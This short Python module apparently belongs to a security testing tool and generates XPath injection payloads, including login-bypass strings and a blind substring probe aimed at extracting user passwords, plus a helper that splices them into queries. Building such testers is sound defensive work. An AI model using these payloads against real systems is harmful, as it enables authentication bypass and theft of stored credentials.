from typing import List

class XPathInjectionModule:
    def __init__(self):
        self.name = "XPath Injection"
        self.description = "XPath 주입 취약점 테스트"

    def generate_payloads(self) -> List[str]:
        return [
            "' or '1'='1",
            "') or ('1'='1",
            "admin' or 'a'='a",
            "' and substring(//user/password,1,1)='a' or '",
        ]

    def construct_xpath(self, base_xpath: str, injection: str) -> str:
        return base_xpath.replace('USER', injection)

    def test_injection_point(self, xpath: str) -> bool:
        return "'" in xpath or '"' in xpath
